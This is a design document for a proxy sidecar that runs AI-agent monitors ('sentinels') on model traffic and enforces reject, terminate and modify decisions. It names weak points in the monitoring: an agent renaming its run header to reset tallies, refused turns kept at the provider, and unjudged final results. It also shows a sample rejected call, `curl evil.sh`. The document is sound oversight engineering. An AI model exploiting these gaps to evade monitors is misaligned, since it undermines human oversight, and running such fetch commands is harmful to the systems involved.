# Host in a proxy: the sidecar

Status: partly built, 2026-10-06. Each section says what is built, what has been measured and what is only designed. The table near the end, "Built and not built", collects this in one place. A claim marked **measured** was run and observed. This document builds on the deployment design in [sentinel-deployment.md](sentinel-deployment.md) and on the spikes in [proxy-host.md](proxy-host.md), and it does not repeat either of them.

The sidecar is a program that runs sentinels beside an HTTP proxy, where the proxy sits in front of a model provider's API. The proxy hands the sidecar each model request and each reply. The sidecar turns them into the steps a sentinel judges, runs the same monitors and protocols that run inside an eval, and tells the proxy what to do with the request or the reply. The code is the package `inspect_sentinel.sidecar`.

## Two kinds of client

The sidecar runs sentinels for two kinds of client.

- **An Inspect eval.** Inspect makes the model calls, for its own agents and for bridged ones. Inspect can tell the sentinel about the task and the sample, and it can act on what the sidecar answers.
- **A naked agent.** The agent makes the model calls itself. Examples are Claude Code in a sandbox, and any agent in deployment. The sentinel has only what is in the model traffic, and the sidecar's answer goes to a program that knows nothing about sentinels.

```
  Inspect eval     Inspect  --->  proxy  --->  provider
  Naked agent      agent    --->  proxy  --->  provider
                                    |
                                 sidecar, running the sentinel
```

Neither kind of client is changed to work with the sidecar. A task that runs through the sidecar does not set `sentinel=`. Whoever runs the proxy chooses the sentinel.

## Words used in this document

- **Step.** One thing a sentinel is asked to judge, such as a tool call the model has proposed. Each step belongs to one of four stages: before a model call, after a model call, before a tool call and after a tool call.
- **Decision.** What a sentinel says about a step: `continue`, `reject`, `terminate`, `modify` or `escalate`.
- **Turn.** One reply from the model: its text and every tool call in it.
- **Conversation.** The list of messages that a model request carries.
- **Run.** One attempt at one sample in an eval, or one session of a naked agent. A run can hold more than one conversation.
- **Proxy hook.** Code of ours that a proxy runs, which forwards the proxy's model traffic to the sidecar. `MiddlemanHook` is one. It is not the proxy's own mechanism for running such code, which Middleman calls its passthrough hook. It is not an Inspect hook either, which is code that an eval runs.

## Goals

1. **One implementation of providers.** The sidecar reads and writes the formats of model providers with inspect_ai's Python code, and has no second implementation of its own. Where inspect_ai's code falls short of what a proxy needs, the gap is listed near the end of this document, under "Asked of inspect_ai", and raised with inspect_ai. The code is not forked.
2. **No in-process advantage.** A sentinel gains nothing from running in the same process as the eval. A task and its sentinel are written as if the sentinel were behind a proxy. Whatever an eval's own host gives a sentinel, the sidecar gives too, or the sidecar says that it cannot.
3. **A sidecar that is mostly independent of the proxy.** Middleman is supported first, LiteLLM second and Envoy third. What is specific to one proxy is kept out of the sidecar where it can be, in a proxy hook that the proxy runs. For a proxy that can run no code of ours, the sidecar has a thin adapter called a shim.

## 1. The shape

A request or a reply reaches the sidecar from a proxy. The handler works out what it means and what should happen to it. The sentinel runner runs the monitors and protocols.

```
   Middleman                 LiteLLM                   Envoy
   runs a proxy hook,        would run a plugin        runs no code of ours
   MiddlemanHook             as its proxy hook
        |                         |                         |
        |     JSON over HTTPS     |                  bytes over gRPC
        +------------+------------+                     (ext_proc)
                     v                                      v
            endpoint for proxies                       Envoy shim
                     |                                      |
                     +------------------+-------------------+
                                        v
                                     handler
   a request or a reply in the provider's format, read into Inspect's types
   and made into steps; which run it belongs to; what was rejected; records
   an answer: pass, replace with this, or refuse and why
                                        |
                                        v    only plain data crosses here
                                 sentinel runner
   `run_sentinel` over the configured monitors and protocols; their store; their model calls
```

- **A proxy hook** is what a proxy runs, where the proxy can load code. It turns what that proxy hands over into the sidecar's messages, sends them, and carries out the answer in that proxy's terms. It knows nothing about sentinels or about model providers. Each proxy hook is a small package of its own, under `src/proxies`. Middleman's is `MiddlemanHook`.
- **The endpoint for proxies** is the same for every proxy hook. A proxy hook POSTs each request and each reply to it as JSON, and is answered with pass, replace or refuse. The messages and the answers are described by `proxy_endpoint.schema.json`, which is written from the endpoint's own models and kept beside it. A proxy hook is tested against that file.
- **A shim** is for a proxy that can run no code of ours, which today means Envoy. It speaks that proxy's own protocol, inside the sidecar. Its dependencies are an optional extra, so only a deployment behind that proxy installs them. No shim is built yet.
- **The handler** is the same for every proxy. The endpoint for proxies, or a shim, gives the handler a `Request` or a `Reply`, and the handler returns one of three answers: `Pass`, `Replace` or `Refuse`. The answer says what was decided. It does not say how the proxy should carry that out, because that is the proxy hook's job, or the shim's. A `Refuse` holds what the client is told: the status, the message and the response headers. Those are passed on in the proxy's own form and are not read on the way. A `Pass` or a `Replace` can also name response headers, which the proxy adds to a reply that goes through. The handler names none on those answers today.
- **The sentinel runner** is the core package's `run_sentinel` function, unchanged. Today it runs in the sidecar's process. Only steps and decisions pass between the handler and the runner, as plain data, so the runner can be moved to a process of its own later. Reasons to move it would be throughput, keeping a sentinel that fails away from the traffic, or running beside a proxy that is not written in Python.

Two rules keep the handler from being limited to what the least capable proxy can do. First, the handler is designed around what a sentinel needs, and not around what one proxy can supply. Second, when a proxy cannot do something, its proxy hook or its shim says so, and the capability stays in the handler for the other proxies.

**Nothing of this package runs in a proxy.** A proxy runs only a proxy hook, which forwards each request and each reply to the sidecar over HTTPS, as JSON. A proxy hook does not depend on inspect_sentinel or on inspect_ai, and is installed by itself. In the other direction, a sentinel imports only the core package and never the sidecar. A test checks that importing the core package does not load the sidecar.

### What each proxy hands over

| | Middleman | LiteLLM | Envoy |
|---|---|---|---|
| where the proxy's side runs | in `MiddlemanHook`, which Middleman loads through its passthrough hook and calls after the caller has signed in | in a plugin, in LiteLLM's process | no code of ours; Envoy's `ext_proc` filter calls the sidecar |
| a request arrives as | parsed JSON, in the provider's format | a dictionary, already parsed | raw bytes |
| a reply arrives as | the provider's bytes, decompressed, held whole | LiteLLM's own objects, or a stream of them that a plugin can hold | raw bytes, in chunks as the provider sends them |
| to refuse | Middleman writes an error in the provider's own format | the plugin raises an exception, which LiteLLM formats | the sidecar sends an immediate response of its own |
| status | built, **measured** | read in LiteLLM's source (1.83.0), not run | **measured** with an earlier Envoy processor; the shim is not built |

Middleman is to have a passthrough hook: a setting that names a class, which Middleman loads at startup. Middleman calls the class with each passthrough request before sending it to the provider. It then holds the provider's reply whole and calls the class with the reply. `MiddlemanHook` POSTs each one to the sidecar's endpoint for proxies, and the answer to each POST is pass, replace or refuse. The passthrough hook has been proposed to Hawk and is not yet merged. It is explained in [proxies/middleman-proposal.md](proxies/middleman-proposal.md).

With each request, the proxy hook tells the sidecar the provider, the model's public name, the user, the run, the headers that say which job and sample the request belongs to, and any other request headers the operator has listed for the proxy hook. No credential is sent to the sidecar: Middleman removes the caller's before it calls the proxy hook. Who can reach the sidecar is the operator's to control: the sidecar listens at an address that only Middleman can reach (section 10). An operator can also limit the proxy hook to some of Middleman's channels. A channel is the kind of caller: an eval, a scan or a direct call. Traffic on the other channels never reaches the proxy hook and streams as it does when no proxy hook is set.

**Middleman's passthrough hook and `MiddlemanHook` are two different things, with different owners.**

- **Middleman owns the passthrough hook.** That covers when a loaded class is called, the holding of a reply, how long one call may take, and what a failed call means. A class loaded through it may decide entirely in process. Middleman knows nothing of the sidecar or of its messages.
- **This package owns `MiddlemanHook`**, the messages it sends and their schema, and the endpoint that receives them.
- **A sentinel's refusal and a failure are told apart.** `MiddlemanHook` turns a refusal from the sidecar into an `HTTPException`, which Middleman answers the client with. A sidecar that can't be reached, or whose answer can't be read, is raised as a `SidecarError`. Middleman's own setting then says whether the call is refused or let through.

**A LiteLLM plugin would send the same messages that `MiddlemanHook` sends.** LiteLLM then needs nothing of its own in the sidecar, because the endpoint for proxies serves every proxy hook. The difficulty is what the plugin would put in the body of the message. LiteLLM parses the traffic before a plugin sees it, and on many routes it converts every provider's reply into OpenAI's shape. The message would therefore have to say which format its body is in. Today the message names only the provider, and the sidecar works out the format from the body. None of this is built. What is said here about LiteLLM comes from reading its source, and has not been run.

## 2. Reading provider traffic

The sidecar reads a provider's request or reply into Inspect's types with inspect_ai's converters. Those converters are functions over a complete request or a complete reply. Agents usually ask for a streamed reply, so the sidecar first puts a streamed reply back together into a whole one. It does this with the accumulator in each provider's SDK, which is what inspect_ai's own providers do.

```
bytes from the proxy → stream events → SDK accumulator → SDK reply → inspect_ai converter → ModelOutput
```

| API | From stream to whole reply | Status |
|---|---|---|
| Anthropic Messages | `accumulate_event`, a pure function in a private module of the SDK | built |
| OpenAI Chat Completions | the SDK's `ChatCompletionStreamState`, read as a snapshot | built |
| OpenAI Responses | the event that ends the stream holds the whole response | built |
| Gemini | the SDK has no accumulator | not started |

**Measured**, 2026-10-05. 21 streams recorded from the live APIs were all read correctly. They covered text, one tool call, parallel calls, text followed by a call, large arguments, reasoning, and turns cut off by the token limit. One Codex session and two captures from Anthropic's beta endpoint were also read correctly. Reading an ordinary turn took under 2 ms, and reading the largest took 15 to 50 ms, on a laptop with nothing warmed up. These measurements used the converters directly, before the sidecar existed. The sidecar's own tests replay eight replies that were recorded the same way.

The rules the sidecar follows when it reads traffic:

- **An unknown value is read, but unknown content makes the turn unreadable.** The sidecar parses field values as leniently as the provider SDKs parse them, so a provider that adds a new value or a new field does not break traffic. Content is treated differently. If a reply contains a content block of a kind the converter does not read, the sidecar treats the whole turn as unreadable. The reason is that the converter would otherwise drop the block, and a tool call that no monitor saw would reach the agent. For Anthropic, the sidecar checks the kind of each block itself, because inspect_ai's Anthropic converter drops an unknown block without an error. inspect_ai's Responses converter raises an error on an unknown item, so the sidecar needs no check of its own there.
- **A request or a reply that cannot be read is treated as one that could not be judged.** It is handled like a turn whose monitor raised an error or ran out of time. A deployment has one setting for all of these cases: refuse, or let through. The default is to refuse. Behind Middleman, that setting is Middleman's own. The sidecar answers the message with an HTTP error, and Middleman then refuses the call or lets it through, as it is configured.
- **The SDK's Beta types are never given to inspect_ai's converter.** Given a Beta type, the converter returns empty content and raises no error (**measured**). The sidecar uses the SDK's plain accumulator instead, which reads the stream from Anthropic's beta endpoint correctly.
- **A reply with more than one choice is unreadable**, because only the first choice would be judged.
- **A proxy names the provider, but not which of the provider's APIs a request is for.** OpenAI has two: Chat Completions and Responses. The sidecar tells an OpenAI request apart by the field that holds its conversation, which is `messages` for Chat Completions and `input` for Responses. It tells a reply apart by the reply's `object` field.
- **Each provider is an optional extra** (`anthropic`, `openai`), as in inspect_ai. A provider's SDK is imported the first time a reply from that provider is read. The minimum SDK versions are the same as inspect_ai's.
- **The sidecar depends on inspect_ai.** inspect_sentinel does already. inspect_ai keeps its wire types (`ChatMessage`, `ModelOutput`, `ToolCall`) in a subpackage, `inspect_ai.core`, so that a sentinel can run without the rest of inspect_ai. The sidecar needs more than that subpackage, because the converters it reads provider traffic with are in inspect_ai proper. Depending on less of inspect_ai is a later optimization, and nothing here waits for it.
- **The tests keep recorded replies as a corpus.** The corpus is there because the Anthropic accumulator is in a private module of the SDK, and its signature has already changed once between SDK releases. A release that changes it again fails these tests.
- **What Anthropic's accumulator loses, the sidecar loses too.** inspect_ai's Anthropic provider notes that the SDK's accumulator drops two things from a stream: compaction content and the code-execution container. The provider repairs both on its own stream object. The sidecar calls the accumulator directly, so it does not get those repairs. This was read in inspect_ai's source, and the loss has not been reproduced.
- **Some of what a request asks for is in its headers, and not in its body.** For example, the beta features a request turns on are named in a header. The sidecar sees that header only if the proxy passes it on. Behind Middleman, the operator chooses which headers are passed on.

A note for monitor authors: with Claude Haiku 4.5, a `ContentReasoning` block arrives with `redacted=True`. The readable thinking is in its `summary` field, and its `reasoning` field holds an opaque string. A monitor that wants the model's thinking reads `summary`.

Not yet checked:

- whole sessions recorded from Claude Code, and longer sessions from Codex
- the kinds of Responses item that inspect_ai's reader raises an error on. A local shell call and a reference to a stored item were seen to raise. inspect_ai's source lists image generation, code interpreter, file search and MCP approval items alongside them. Each of these makes a turn unreadable; none of them passes unseen.
- the Responses API's compaction endpoint, which Middleman routes
- Gemini
- the cost of reading under load, and on Linux

## 3. From traffic to steps

A proxy sees one model request and its reply at a time. It never sees a tool run. The table shows where each stage of a sentinel falls in what a proxy does see.

| Stage | Behind a proxy | Status |
|---|---|---|
| `BeforeGenerate` | the request, before it is sent to the model | not built; waits for the generate stages (pull request #42) |
| `AfterGenerate` | the reply, before the client receives any of it | not built; waits for the generate stages (pull request #42) |
| `BeforeToolCall` | each tool call in a reply, before the client receives it | built, **measured** |
| `AfterToolCall` | each tool result in the client's next request, before the model is sent it | built, **measured** |

**`AfterToolCall` is judged at the moment the stage is defined by.** The stage is the moment after a tool has run and before the model sees its result. Behind a proxy, the tool's result arrives inside the client's next request, on its way to the model, and the sidecar is holding that request. The agent already has the result, and the model does not have it yet. The sentinel can let the request go on or end the run, which are the only two decisions that are legal after a tool call has run. Two differences from an eval remain:

- The last tool result of a run is never judged, because no request follows it. The model never sees that result either.
- Every later request repeats every earlier tool result, because each request carries the whole conversation. The sidecar puts each result to the sentinel once. To do that, it remembers a digest of each tool call and result that it has already shown the sentinel. A client that sends a request again, or whose conversation has grown, therefore does not have the same result counted twice. The digest covers the call as well as the result, because the client wrote both of them into the request. When a sentinel ends the run at a result, that result is not remembered, so sending it again ends the run again.

**What a step contains.** A step's `input` is the list of messages the model was sent. It includes the rejected turns that the sidecar adds (section 4). A step's `history` is the conversation as it stood when the tool call was made.

**A tool that the provider runs gets no `BeforeToolCall` step.** Web search, code interpreter and file search are examples. The provider has already run such a tool by the time the reply reaches the proxy, so a `BeforeToolCall` step would offer the sentinel a choice that no longer exists. The sidecar recognises these tools by name. Monitors can still see them in the model's output, which is where Inspect puts them. The one place to stop a tool that the provider runs is the request, before the model is called. A protocol narrows the list of tools offered at the `BeforeGenerate` stage, and the sidecar removes that one tool's definition from the request and leaves the rest of the request alone. A provider accepts a request whose history used a tool that the request no longer offers (**measured**, Anthropic). The narrowing depends on the generate stages and is not built. Not yet checked: OpenAI's provider-run tools; tools reached through a provider-side MCP connector; and a request whose `tool_choice` names the tool being removed.

## 4. From a decision to the wire

A sentinel's decision has to be carried out on the request or the reply that the proxy is holding. The table says what the sidecar does for each decision.

| Decision | What the sidecar does | Status |
|---|---|---|
| `continue` | the provider's bytes are passed on as they came | built |
| `reject` | the client is sent an error, and the model is told about the rejection on every later request of the conversation | built, **measured** |
| `terminate` | the client is sent an error that says a sentinel ended the run, and so is every later request of that run | built |
| `escalate` at the top level, and `human()` | the case is queued for a person to review, and the step goes on | the step goes on; the queue is only a log line today |
| `modify` | one block is replaced in the provider's original document | **measured** for Anthropic; not built in the sidecar |

### Refusing a turn

When the sidecar refuses a turn, the client receives an HTTP error in place of the model's reply. The error is in the provider's own error format and carries the reason.

- **A turn is refused whole.** If a reply holds several tool calls and one of them is refused, the whole reply is refused. The alternative would be to refuse one tool call and release the others. That would leave the agent holding a turn it can never finish running, and a conversation that the provider would reject if the agent continued it.
- **The status is 400.** A 403 is not used, because Claude Code reports any 403 as a failure to authenticate, whatever the body says (**measured**).
- **Only the decision's `message` reaches the client.** The decision's `explanation` goes to the log and is not sent to the client.
- **The refusal names the decision in a response header.** The header is `x-sentinel-decision`, and its value is `reject` or `terminate`. The sidecar sends the header to every client and does not need to know what kind of client it is. A client that knows of sentinels acts on the header, and any other client ignores it and is left with an ordinary HTTP error. The header says nothing that the error's message does not already say. The sidecar hands the header to the proxy, and the proxy puts it on the error it answers the client with. Behind Middleman, the sidecar's answer to Middleman carries the header, and Middleman adds it to the error (built, **measured**).

### `reject`: an error to the client, and the model is told

Inside an eval, a rejected tool call is not run. The rejection is put where the tool's output would have been, and the model is called again. Behind a proxy, the sidecar gets the same result without ever calling the provider itself:

1. The sidecar withholds the model's reply. It sends the client an error that says a sentinel rejected the call, and why.
2. The sidecar keeps the model's rejected message and the reason, for that conversation.
3. On every later request of that conversation, the sidecar adds two things at the point where the rejection happened. The first is the model's own rejected message. The second is a tool result for each call in that message: the rejected call's result is the reason, and any other call in the same turn gets a result that says it was not run. These are the same entries Inspect adds in an eval's process, and inspect_ai renders them in the request's own format. Nothing else in the request is changed. The request is written out again as JSON, so it is equal to the original as data, but not byte for byte.
4. The model sees its own call and the rejection, and answers with something else.

```
agent  -->  sidecar  -->  model      a request
            sidecar  <--  model      reply: run `curl evil.sh`             rejected; withheld; kept
agent  <--  sidecar                  an error: "a sentinel rejected this call: no network access"

agent  -->  sidecar                  the next request of that conversation
            sidecar  -->  model      the same request, with [the curl call] and ["rejected: no network access"] added
agent  <--  sidecar  <--  model      reply: run `ls /tmp`
```

- **The rejection is added for the rest of the conversation, and not for one request only.** The client received an error, so the client's own copy of the conversation never contains the rejected turn. If the sidecar stopped adding the rejection, the model would see a conversation in which it had changed course for no reason, and it would propose the rejected call again (**measured**: it did).
- **How the sidecar knows that a request continues a conversation.** The sidecar compares a digest of the request's entries with the digest it kept when it rejected the turn. The digest leaves out the parts that a client changes while the conversation stays the same. This matters for Anthropic, because inspect_ai's Anthropic provider moves its cache marks to the latest messages on every request. Entries compared exactly as written would match only an immediate retry. OpenAI's formats are compared as sent. For Anthropic, the model being told again on a later request, after the conversation has grown, is **measured**. For OpenAI, only the immediate retry has been seen.
- **Three rejected turns in a row end the run.** This is the limit that inspect_ai's bridge uses. A reply that passes starts the count again.
- **The status of the error is configurable**, with `--reject-status`. The default is 400, and a client treats a 400 as final. An operator can choose a status that a client retries without being asked, such as 503. An unmodified Inspect then sends the same request again, the sidecar sends it on with the rejection added, and the sample carries on (**measured** on Anthropic and on both OpenAI APIs). This relies on the client's retry logic and is a workaround. The intended form is that the eval asks the sidecar what was decided and acts on the answer (section 9). inspect_ai does not do that yet, and it is among the things asked of inspect_ai near the end of this document.
- **A naked agent receives the error.** Claude Code reports a failure and stops (**measured**). For Claude Code the run ends there, unless someone starts it again. If it is started again and continues the same conversation, the sidecar adds the rejection as usual, so the model is told with no help from the agent.

Two other ways to carry out a `reject` were considered and not taken:

- **The proxy calls the model again itself, and passes the new reply to the client.** The client gets a reply and no error. But this makes the proxy a client of the provider.
- **The sidecar rewrites the reply, and puts text where the tool call was.** Most agents read such a reply as a finished turn, so they stop and wait.

### `terminate`: the run stays ended

Inside an eval, a `terminate` ends the sample, and Inspect makes no more model calls for it. Beside a proxy, the sidecar can only refuse requests. So when a sentinel ends a run, the sidecar refuses the request or the reply that the run was ended at, and then refuses the later requests of that run with the same error. The sentinel is not asked about those later requests.

Which later requests belong to the ended run depends on whether the run has a name (section 7).

- **A run that the proxy names.** Every later request with that name is refused, whichever conversation it carries. A subagent's conversation is refused too.
- **A run with no name.** The sidecar groups such requests by how the conversation opens, and every conversation with the same opening is in the same group. Refusing the whole group would refuse conversations that have nothing to do with the one that was ended, such as another person's session. So the sidecar refuses a later request only if it continues the conversation the run was ended in. A request continues that conversation if it starts with the same entries the conversation had when the run was ended. The sidecar tells by comparing hashes of the entries, because a request carries no id for its conversation.
- **A run with no name, ended before the sidecar passed on any reply in that conversation.** The ended conversation then holds only its opening. A later request that opens the same way could be a retry, or it could be someone else's first request, and nothing in the two requests differs. The sidecar does not remember this run as ended, and the sentinel judges the next request afresh. No request passes unjudged.

A run stays ended for as long as the sidecar holds the run's state, which today is in memory, in one process (section 10). Nothing an eval sends can undo it, because no method of the endpoint for evals changes a decision (section 9).

### `modify`: keep the original, replace one block

A `modify` decision changes the arguments of one tool call. To carry it out, the sidecar keeps the provider's original document and replaces only the block that changed.

The reason is what a full re-render loses. Rendering a whole turn back through inspect_ai keeps the content: thinking with its signature, text with citations, tool calls and server tool results. It loses what surrounds the content: cache marks, the request's top-level fields and usage detail (**measured**, Anthropic). So the sidecar keeps the provider's original document, has inspect_ai render the changed tool call as one block, and puts that block in place of the old one. In a test on a streamed reply, with new arguments for one call, 60 of 65 events went out byte for byte. The stream read back with the new arguments and the same thinking signature (**measured**).

Replacing one block needs something that inspect_ai does not supply: where each block sits in the provider's original document. The sidecar keeps a small map of that for each provider. The map is the one exception to goal 1, one implementation of providers.

**Replacing a whole request or a whole reply** follows the same idea. A replacement list of messages is mostly the same as the list it replaces. Unchanged messages keep their original bytes, and only the changed messages are rendered. A whole replacement reply, for an agent that asked for a stream, has to be written as a stream. inspect_ai has code that does this in its in-sandbox model proxy. Neither kind of replacement has been run. Two questions are open. The first is whether a provider's prompt cache still matches when the untouched parts are equal as data but not byte for byte. The second is whether it matters that a changed stream still carries the provider's original token counts.

Neither `modify` nor `reject` is legal after a tool call has run, so the sidecar never changes a tool's result as a decision about that result. A protocol that wants to keep something from the model replaces the input at the `BeforeGenerate` stage instead. The protocol decides again on each request, so nothing has to remember an earlier edit.

## 5. Holding a turn

A sentinel decides with the whole turn in front of it. Nothing from a reply can reach the client until the decision is made, so something has to hold the reply in the meantime. What holds it depends on the proxy.

- **Middleman holds the reply itself.** When the sidecar has answered, Middleman passes on the provider's bytes, or the replacement, or an error with a real HTTP status. Middleman holds back the provider's keepalives as well, so during a long generation the client hears nothing until the reply is finished. Middleman decompresses the provider's reply itself and sends replies to its clients uncompressed, so the sidecar handles no compression behind Middleman (**measured**).
- **Envoy does not hold the reply, so the sidecar does.** Envoy hands over chunks as the provider sends them. Envoy's `ext_proc` filter has four modes for a response body, and only the last of them works for holding a turn:

  | Response body mode | What happens (**measured**, Envoy 1.39.1) |
  |---|---|
  | `BUFFERED` | fails with a 500 above the connection buffer (1 MiB) and above gRPC's message size (4 MiB); deadlocks on a compressed body behind the decompressor |
  | `BUFFERED_PARTIAL` | corrupts data above the buffer limit |
  | `STREAMED` | wants one answer per chunk, so a processor that stays silent to hold a turn deadlocks |
  | `FULL_DUPLEX_STREAMED` | chunks arrive as sent, and the processor may answer when it likes |

  In `FULL_DUPLEX_STREAMED` mode, answering any response-body message commits the response's status, and staying silent does not. So for as long as the sidecar has answered nothing, it can still refuse with a real status. The Envoy shim is to use `FULL_DUPLEX_STREAMED` from its first version. It is also to raise the request-side message timeout, which is 200 ms by default, less time than a monitor that asks a model needs. The shim's Envoy configuration is to be generated, because each of these settings is wrong by default.
- **A hold has two limits: a largest size and a longest time.** There is a defined answer when either limit is passed. While nothing has been released to the client, that answer can be a real 503. Middleman has both limits: unless set otherwise, it waits 30 seconds for each answer from the sidecar and holds up to 32 MiB of reply. The sidecar has a size limit of its own on each message it reads from a proxy. That limit is 64 MiB by default and is set with `--max-body-bytes`. The sidecar answers a larger message with a 413 and does not pass it to the handler, and the proxy treats that as a turn that could not be judged. The default of 64 MiB is large enough for Middleman's largest reply, because Middleman sends a reply as base64, which is a third larger than the reply itself.
- **A sentinel is not timed by default.** When a proxy stops waiting for the sidecar's answer, the sidecar is not told, and the sentinel carries on until it has decided. This is deliberate. An eval can still ask the sidecar what was decided (section 9), and a late `reject` or `terminate` still counts for the run. What a late decision cannot do is change what the client received, because by then the proxy has acted without it. A proxy that refuses a failed call has refused this one and discarded the reply. A proxy that is set to let a failed call through has already sent the reply on, so a late `reject` is recorded against a reply the client has. So if a monitor is usually slower than the proxy's wait, the proxy's wait needs to be raised. Behind Middleman the wait is `MIDDLEMAN_PASSTHROUGH_HOOK_TIMEOUT_SECONDS`, which is 30 seconds unless set. That default suits a rule that decides at once. A decision can take far longer, up to hours when a person is asked, so an operator sets the wait for the slowest decision they expect and not for a typical one. It applies to each call of `MiddlemanHook` separately, one for the request and one for the reply, and the call for a reply starts only once Middleman has the whole reply. It is not a limit on how long a turn is held. An operator who wants a ceiling on the sentinel sets `--time-limit`, in seconds. A sentinel that passes the limit is cancelled, the sidecar answers the proxy's hook with a 504, and the request is recorded as not judged, with the time limit as the reason. Only a monitor that is waiting, for a model or for the network, can be cancelled this way. Whatever the monitor had already written to the run's store stays there.
- **What a refusal looks like to the agent's SDK depends on how much has been released** (**measured** with the earlier Envoy processor):
  - Nothing was released, and then the turn is refused. The SDK raises a typed API error, with the status and the error body the sidecar chose.
  - Some bytes were released, and then the turn is refused. The SDK sees a stream that was cut off.
  - Some content was released, and then an error event is sent inside the stream. The SDK raises a typed API error, although the HTTP status was 200.
- **A long hold can lose the connection.** While a turn is held, the client is sent nothing. Something between the client and the proxy, such as a load balancer, may close a connection that has been silent for too long, whatever the proxy's own wait is set to. So a decision that takes hours, as when a person is asked, cannot be delivered by holding one request open. It needs another way to reach the client, such as the bullet below, or a refusal the client comes back from. Not designed.
- **Keeping the connection alive while holding.** Middleman could do this alone, with no change to the sidecar. Middleman would send the success status and its keepalives at once, hold all of the content, and deliver a refusal as an error event inside the stream. The client would no longer wait in silence, but a refusal would no longer have a real HTTP status. Not built.
- **Releasing part of a turn early.** This means passing on text as the model writes it, while still holding the tool calls. It worked with the earlier Envoy processor: the sentinel's decisions were still enforced. It has two costs. The status line has already been sent, so a refusal cannot have a real status. And when the rest of the turn is refused, the agent is left with half a turn that it cannot act on. Behind Envoy, releasing early needs work in the shim and the handler only, because Envoy already hands over chunks and accepts an answer at any time. Behind Middleman, it also needs Middleman to hand over chunks, which is a larger change to Middleman. The sentinel is the same in both cases, because it judges complete steps. Not built. The Envoy shim is to hold everything at first.
- **Compressed bodies.** This applies to a proxy that hands over the provider's bytes as they came, as Envoy does. The sidecar decodes a reply by its `Content-Encoding` in order to read it. A reply that passes is sent on as the provider's original bytes. A reply that is replaced is sent in an encoding the client accepts, with headers that match the bytes sent. The Envoy shim is to start by asking the provider for an uncompressed reply.

## 6. Providers that keep the conversation

The deployment design depends on every request carrying the whole conversation, because the whole conversation is what a monitor reads. OpenAI's Responses API can store the conversation at the provider. A client that uses this sends only the new part of the conversation, and a reference to the rest.

**The sidecar does not support conversations stored at the provider.** The clients tested do not use them: inspect_ai sets `store=False` and sends the whole conversation, and Codex does the same by default (**measured**).

- **A request that depends on a stored conversation is unreadable.** That is a request with a `previous_response_id` or a conversation id. Without the earlier turns, a monitor would be judging a fragment of the conversation and could not know it. Built.
- **A request that asks to be answered in the background is unreadable.** The client fetches the reply later with a separate call, and the sidecar is never shown that call. Built.
- **A request is unreadable if one of its items is a reference to a stored item, with no content.** inspect_ai's reader raises an error on such an item.
- **The endpoints that read stored turns are not routed through the proxy.** The provider generates and stores a turn before the sidecar decides on it, so refusing a turn does not stop the turn existing at the provider. In a test, a refused `send_email` call came back, arguments included, from an ordinary request for the stored conversation (**measured**). What the sidecar promises is that a refused turn never reaches the agent through the proxy. That promise holds only while the endpoints that read stored turns are closed, or are judged. Middleman routes none of them.
- **The `store` field is left as the client sent it.** A client that sends the whole conversation, and also asks the provider to store it, is judged like any other client.

## 7. Which run a request belongs to

Some protocols count. An example is a protocol that ends a run after three rejected calls. A count like that, called a tally here, has to be kept separately for each run, so the sidecar has to know which run each request belongs to.

In an eval, the sidecar cannot work that out from the conversation. A fingerprint of how a conversation opens is the same for every epoch of a sample, and the epochs often start at the same moment. A tally kept under that fingerprint would be shared by all of the epochs (**measured**: with four epochs running at once, one was ended by a limit that no single epoch had reached).

- **The eval says which run a request belongs to.** The plan is for inspect_ai to send headers that name the task, the sample and the epoch. Today inspect_ai sends only `x-irid`, which is an id for a single request. Under Hawk the names are already there: Hawk's runner stamps each model request with the job, the task, the sample and the epoch, and Middleman shows those headers to the proxy hook it runs. `MiddlemanHook` names the run by the runner's sample identifier, the `x-inspect-sample-uuid` header, which is different for each epoch (built, **measured**). The sidecar keys a run by the name a proxy hook gives it, and knows no proxy's header names. That identifier is not the uuid that the eval log gives the sample. Inspect makes a second id for each attempt at a sample, and the header carries that one.
- **A run that the proxy names is one run, however many conversations it holds.** A subagent's conversation belongs to the same run. Rejected turns are still kept separately for each conversation within the run.
- **Scans and graders use the same proxy.** The model calls of a Scout scan, and of an eval's grader, pass through Middleman as an agent's calls do. They reach the sidecar unless the proxy is configured to keep them from it. The job's type is among the headers a sentinel is given (section 8), so a sentinel can tell a scan from an eval. Nothing marks a grader's calls.
- **Headers carry short names and nothing more.** A sample's fuller details, such as its input and its metadata, reach a sentinel in the way section 9 describes.
- **When no header names the run, the key is how the conversation opens.** This is the production case, where two conversations rarely open with the same text.
- **A naked agent's name for its run is trusted, for now.** With a naked agent, the headers are set by something inside what is being watched. A model in control of the agent could change the name and start again with a clean tally, and with a run that is no longer ended. A check can be added later. The check would be that a run's name first appears at the start of a conversation, because a swapped name would turn up on a conversation that already has model turns behind it.
- **A tally can be kept at more than one level.** One level is the sample: one tally for each run, which is what `context.store_as()` gives in an eval today. Another level is the task: one tally shared by every sample. How a sentinel says which level it wants is not yet designed.

## 8. What a sentinel is given

The table lists what a sentinel is given when it runs inside an eval's process, and what the sidecar gives it in each case.

| Given in an eval's process | In the sidecar | Status |
|---|---|---|
| `step.call`, `message`, `input` | read from the request and the reply | built |
| `step.history`, with turns the agent has since compacted away | only what the request carries | built; a record that survives compaction needs a store |
| `step.conversation` | the run's key (section 7) | built |
| `step.view` | an empty view. A tool's registered viewer is not in the model traffic, and inspect_ai's default rendering of a call is made by a private function | built as empty |
| `AfterToolCall.output`, the tool's return value before truncation | left empty. Only what the model is sent is in the model traffic, and a monitor works from `result` | built; explained below |
| `context.eval` | None, unless the eval itself registered the sample with the sidecar (section 9) | built |
| `context.proxy`, which is None in an eval's own process | the provider, the model and the user as the proxy names them, and the request headers the proxy passed on | built |
| `context.store_as()` | a store kept for the run, in the sidecar | built, in memory |
| `context.host.generate` | the sidecar calls models itself through inspect_ai, with roles from its own configuration. There is no agent's model to fall back on | built, calling the provider directly; explained below |
| `context.host.ask_human` | the case is queued for a person to review, and the step goes on | built as a log line |
| records in the eval's log | kept in the sidecar, where the eval can ask for them (section 9) | built, in memory |

**`context.eval` is never filled from the model traffic.** The nearest thing in the traffic to the sample's input is the conversation's first user turn. That turn has been through the agent, which may have wrapped or rewritten it. `EvalContext` promises that nothing in it came from the agent, so the sidecar leaves `eval` as None until the eval itself has supplied the details. This is also how a monitor tells which kind of client it is serving: for a naked agent, `context.eval` is always None.

